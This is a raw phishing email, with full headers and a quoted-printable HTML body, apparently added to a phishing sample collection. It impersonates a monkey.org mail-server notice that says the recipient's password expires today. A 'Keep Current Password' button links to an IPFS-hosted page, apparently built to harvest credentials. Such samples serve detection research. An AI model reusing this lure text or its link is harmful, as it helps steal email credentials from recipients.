@@ -1,0 +1,200 @@
+Return-Path: services@seeberger-hats.org
+Delivered-To: jose@monkey.org
+X-FDA: 83059343598.09.9A9F9B7
+Received: from s1098920.srvape.com (s1098920.srvape.com [91.219.151.106])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 159B41A0002
+	for <jose@monkey.org>; Wed, 29 Jan 2025 05:22:17 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=seeberger-hats.org header.s=dkim
+ header.b=Hwonr9nl;
+	spf=pass (imf01.b.hostedemail.com: domain of services@seeberger-hats.org
+ designates 91.219.151.106 as permitted sender)
+ smtp.mailfrom=services@seeberger-hats.org;
+	dmarc=pass (policy=quarantine) header.from=seeberger-hats.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1738128138;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=sAJz256PVJYloiC8oiP2EXLECtxxewdqUA+VqULnNd4=;
+	b=RQTF9BnyZ9VO3n0HQLPX7AAV/c9knTc1iqkehtxFKD87OaVS5Tnd6Eh+O/EI1PcbaOaU3I
+	Ju17TEuPmflOQ/qHIYvNHTyghNUbMBw3aYhADRtITB0FT8YIVqucAv4BBEiLxywG8ntSMR
+	3QXkk0ntSvWiWFZCN2rNCzLALevCoZ8=
+ARC-Authentication-Results: i=1;
+	imf01.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=seeberger-hats.org header.s=dkim
+ header.b=Hwonr9nl;
+	spf=pass (imf01.b.hostedemail.com: domain of services@seeberger-hats.org
+ designates 91.219.151.106 as permitted sender)
+ smtp.mailfrom=services@seeberger-hats.org;
+	dmarc=pass (policy=quarantine) header.from=seeberger-hats.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1738128138; a=rsa-sha256;
+	cv=none;
+	b=ca2q0ySLThqhZ/NZ0MCHlMCwKzIqbtS0GqzQO5Bfu3OYvjAzrj4HPgVS5nIvaQ4tEJM9Zi
+	juwmOVjBOxxs4Bpzy7J2V84BraRZ94S+05WZm98DWqbuFrtCr1OfwU7kOYnYHixE9SVbil
+	OmbasjmZw1pMw8j2WzT7jiec5yI7Neg=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=seeberger-hats.org; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=sAJz256PVJYloiC8oiP2EXLECtxxewdqUA+VqULnNd4=; b=Hwonr9nlITKeqi8x6j4RU2LPYI
+	Y1AXvOzuVtLhvn5g/cmd6zl4+Apc+xPXW2wVNVbN9kOAkMRoniXBkcIusNZrI6PF4Pq9/Civw38LV
+	qPuKkOz8jIe8zQz6hy/ruPykax8dv+xdc4T/spv6IgzM+h6BD+dg3KPrlMndnw3UeYeY=;
+Received: from [173.211.106.145] (helo=seeberger-hats.org)
+	by s1098920.srvape.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.93)
+	(envelope-from <services@seeberger-hats.org>)
+	id 1td0Wl-001qbP-R8
+	for jose@monkey.org; Wed, 29 Jan 2025 08:22:16 +0300
+From: monkey.org    <services@seeberger-hats.org>
+To: jose@monkey.org
+Subject: [ACT NOW] Incoming mails has blocked (2025 Update)
+Date: 29 Jan 2025 05:22:03 -0800
+Message-ID: <20250129052202.9C273C9B14FA16E7@seeberger-hats.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-SPF-Fail: YES
+X-Rspam-User: 
+X-Stat-Signature: my69mx759n6i53ocjbwd7onuzm6fco41
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: 159B41A0002
+X-Spam-Status: Yes, score=17.36
+X-HE-Tag: 1738128137-714772
+X-HE-Meta: 
+ U2FsdGVkX19XcEwF+VFjkX4wgTG8LLnHUiHukKOiFvFS/iP4SATuBQgl31cW0flA5kOVASvXDqvDMhL1phfZck3rFpJo+qfGRBBQJlOPZFw+iM2JZhzzJ705LVjRXOQ2NykPg9knIurlrCz947HoRQY6AOajjUn00W+uWP+DLCvcAMslcR5VVTFfpXX8FDLboTd5TPVUb7Hr1Sa5oQnyRX8gTmEuJeZVUbpjpbsxJYhRTssc3iWoLGxqcITmnNQvbY5rnilOdvNweQiePsvGZT4ZJZnwv+WZQCFqxYyXbptPvTLf5dcqGHeaWEBAU9kQIegsjIY3FO1aG20XbJ7l8GO8FFZY74nP7jpii/crXGzxzHusgc7cFbWmC/zbPwSfoDmT0aOLk3k19r8n3wRk62FCsv3TwHjbleIEYD61LSn0/Didd1ak63ibip3MOhUZNPnfm8wJh7Rr92RnpDaADcajEiYcwrratWSXV85TqQMveRy5H6ujVjsdxSHS/f2z3BkTOwgDK27urn0gnmv+mS7ejAflvCcpr93TQDjS+qoKkLQxe0wJy5SZYhTSIxuP1dl4vPIkZtXxGJq50szWkbe1taL+C9bb3MENn9cGSzYsm5KZpMzzGkqhXq/PBuiSjiARM9yZALYZyGHAITLNqsK2HVJbNB6V0vqeGurLdnACDxuU6SKpcnDgybglN5M+2N5I3YXU5R7oT07FknXXpBCmHYumvT7eNSrY6sGjPwHj/4JhMs4ojwm6GiTyQ3eCAx+EUc6ae10jwNUG7m6I8odTu5SFjSeYesijeXgpS238hwWVY4+/jFdGZMuqOaVeOr3AqblcutcOEY2NdF2OFL83U51uHNdQ7u0ESm6OUNppcuGiF14WpVHw3HwmXz1ZAzhrMI3HQus28hQJFt5yRlVCTaCdHubH/KbnpIZdJTjtNRO8t3/7D05dkxdtaaKQfY2zOPh38mxJCI0t4LNxF1rAw0U
+ +/bpfFIEZChZ2duvcHrc1KHONwtI7VOeD0vfGhGI1InoHBesM760faKspkZ8X4rr0ZMS5c32MZtcSSQsDMxiktSMa2CmXJhesIBzguD6zoINqiAYwIf1KjGLq0ywKQFz+18Hqy8SeSldgB1ZlNWdvwv3NuuBGoPhVcIRCHI5QnBAKswGoVr9c2tDLbFCNGyWGnJM59c6a0YFWoAyslLuYABG4kwnBKm0Q2gaviUdO1cdEHsICF6ACS0ifFjre1mrKv+FlAjlPx+BrFbrohWvSEu3age6J4AtHdrLq7+YkLtb/eledchI6zykAYDwifVDcxmhH5+ATfDotI56dCvdjE3KumAMP1L8ePxHQUie+w0fMpXKKaMVLvBY5HYL9fNwrjLehjpzXGLanM9Poq++omz5hXUhc4Q/aToBJ3BywAnBzX6qsn6Wh3eDQ6XOMOwGScWMncsdVMVHwArcEHCgXXs0CFPTuJlmoBSCcExkIqFzlnAgelxbSf+MDx5VCbOji5Iptoz2/Koid9SooF8uY8fvYkMyMecYoBgGGlWfW864yYyYWc4GSbnlUqg==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 25
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"640" style=3D'color: rgb(68, 68, 68); text-transform: none;=
+ letter-spacing: normal; font-family: "segoe ui semilight", "segoe ui", ver=
+dana, sans-serif, serif, emojifont; font-size: 18px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: co=
+llapse; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-b=
+ox;"><tr style=3D"box-sizing: border-box;"><td width=3D"582" align=3D"right=
+" valign=3D"bottom" style=3D"margin: 0px; padding: 22px 0px; color: rgb(255=
+, 255, 255); font-family: arial; border-collapse: collapse; box-sizing: bor=
+der-box;" bgcolor=3D"#0072c6"><font style=3D"box-sizing: border-box;">
+<span style=3D"font-family: arial, helvetica, sans-serif, sans-serif; font-=
+size: 26px; box-sizing: border-box;">&nbsp;<font style=3D"vertical-align: i=
+nherit; box-sizing: border-box;"><font style=3D"vertical-align: inherit; bo=
+x-sizing: border-box;">&nbsp;&nbsp;&nbsp;Notification Update&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></font></span></font>
+</td><td width=3D"28" style=3D"margin: 0px; padding: 0px; border-collapse: =
+collapse; box-sizing: border-box;" bgcolor=3D"#0072c6"><br style=3D"box-siz=
+ing: border-box;"></td><td width=3D"1" style=3D"margin: 0px; padding: 0px; =
+border-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#e3e3e3"><br=
+ style=3D"box-sizing: border-box;"></td></tr></tbody></table>
+<table width=3D"640" style=3D'color: rgb(68, 68, 68); text-transform: none;=
+ letter-spacing: normal; font-family: "segoe ui semilight", "segoe ui", ver=
+dana, sans-serif, serif, emojifont; font-size: 18px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: co=
+llapse; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-b=
+ox;"><tr style=3D"box-sizing: border-box;"><td width=3D"1" style=3D"margin:=
+ 0px; padding: 0px; border-bottom-color: rgb(227, 227, 227); border-bottom-=
+width: 1px; border-bottom-style: solid; border-collapse: collapse; box-sizi=
+ng: border-box;" bgcolor=3D"#e3e3e3"><br style=3D"box-sizing: border-box;">=
+</td>
+<td width=3D"28" style=3D"margin: 0px; padding: 0px; border-bottom-color: r=
+gb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid; bo=
+rder-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#ffffff"><br s=
+tyle=3D"box-sizing: border-box;"></td><td width=3D"582" valign=3D"top" styl=
+e=3D"margin: 0px; padding: 20px 0px 30px; border-bottom-color: rgb(227, 227=
+, 227); border-bottom-width: 1px; border-bottom-style: solid; border-collap=
+se: collapse; box-sizing: border-box;" bgcolor=3D"#ffffff">
+<font color=3D"#000000" style=3D"box-sizing: border-box;"><font style=3D"ve=
+rtical-align: inherit; box-sizing: border-box;"><font style=3D"vertical-ali=
+gn: inherit; box-sizing: border-box;">Hello jose@monkey.org</font></font></=
+font><font color=3D"#000000" style=3D"box-sizing: border-box;"><span style=
+=3D"font-weight: bolder; box-sizing: border-box;"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">,</font></font>
+<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
+></span><font style=3D"vertical-align: inherit; box-sizing: border-box;"><f=
+ont style=3D"vertical-align: inherit; box-sizing: border-box;">Your passwor=
+d for jose@monkey.org</font></font></font><font style=3D"vertical-align: in=
+herit; box-sizing: border-box;"><font style=3D"vertical-align: inherit; box=
+-sizing: border-box;">&nbsp;</font></font><font color=3D"#000000" style=3D"=
+box-sizing: border-box;">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;">expires today 1/29/2=
+025 5:22:02 a.m.</font></font><br style=3D"box-sizing: border-box;"><font s=
+tyle=3D"vertical-align: inherit; box-sizing: border-box;"><font style=3D"ve=
+rtical-align: inherit; box-sizing: border-box;">Follow below to keep your c=
+urrent password and update your account.</font></font></font><font color=3D=
+"#3d85c6" style=3D"box-sizing: border-box;">
+<br style=3D"box-sizing: border-box;"></font><span style=3D"font-size: smal=
+l; box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span><d=
+iv style=3D"font-family: arial, sans-serif, serif, emojifont; font-size: 12=
+px; box-sizing: border-box;">
+<a style=3D'margin: 0px; padding: 14px 7px; border-radius: 4px; width: 210p=
+x; text-align: center; color: white; font-family: "open sans", "helvetica n=
+eue", arial; font-size: 15px; display: block; max-width: 210px; box-sizing:=
+ border-box; background-color: rgb(0, 126, 230); text-decoration-line: none=
+;' href=3D"https://ipfs.io/ipfs/bafkreia6adldtoxw7xdtfpn3qde3sveedxcuhvgit2=
+cqejroevcbuppdn4#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
+/bafybeih23crxeaaxaep5wx2pkhftmukwlj7pco3fwuats6ydza6p3lmk3i/indesx.html%23=
+%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1736998492115000&amp;usg=
+=3DAOvVaw1tRicgfdLlzvYfFF9oSu3a"><font style=3D"vertical-align: inherit; bo=
+x-sizing: border-box;"><font style=3D"vertical-align: inherit; box-sizing: =
+border-box;"><span style=3D"font-weight: bolder; box-sizing: border-box;">K=
+eep Current Password</span></font></font></a>
+<div style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">&nbsp;</div><di=
+v style=3D"color: rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"box-s=
+izing: border-box;"></div></div><table style=3D"border-collapse: collapse;"=
+ border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizin=
+g: border-box;"><tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" style=3D'margin: 0px; padding: 20px 0px 0px; color: rgb(=
+61, 61, 61); font-family: "segoe ui", arial, sans-serif; font-size: 10px; b=
+order-top-color: rgb(227, 227, 227); border-top-width: 1px; border-top-styl=
+e: solid; border-collapse: collapse; box-sizing: border-box;'><table style=
+=3D"width: 509px; font-family: roboto, robotodraft, helvetica, arial, sans-=
+serif; border-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpaddi=
+ng=3D"0"><tbody style=3D"box-sizing: border-box;">
+<tr style=3D'color: rgb(64, 64, 64); line-height: 26px; font-family: "open =
+sans", helveticaneue-light, "helvetica neue light", "helvetica neue", helve=
+tica, arial, "lucida grande", sans-serif; font-size: 16px; box-sizing: bord=
+er-box;'><td style=3D"margin: 0px; box-sizing: border-box;"><p style=3D"mar=
+gin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;"><font color=3D"=
+#0e66f1" style=3D"box-sizing: border-box;"><span style=3D"font-weight: bold=
+er; box-sizing: border-box;">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;">monkey.org</font></f=
+ont></span></font><font style=3D"vertical-align: inherit; box-sizing: borde=
+r-box;"><font color=3D"#000000" style=3D"box-sizing: border-box;"><font sty=
+le=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;Notification.=
+</font></font></font></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; =
+box-sizing: border-box;">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font colo=
+r=3D"#000000" style=3D"box-sizing: border-box;"><font style=3D"vertical-ali=
+gn: inherit; box-sizing: border-box;"><i style=3D'color: rgb(69, 71, 77); f=
+ont-family: "Helvetica Neue", Helvetica, arial, sans-serif; font-size: 11px=
+; box-sizing: border-box;'>Copyright &copy; 2025 Email server.</i></font></=
+font></font></p></td></tr></tbody></table></td></tr></tbody></table></td></=
+tr></tbody></table></body></html>
+
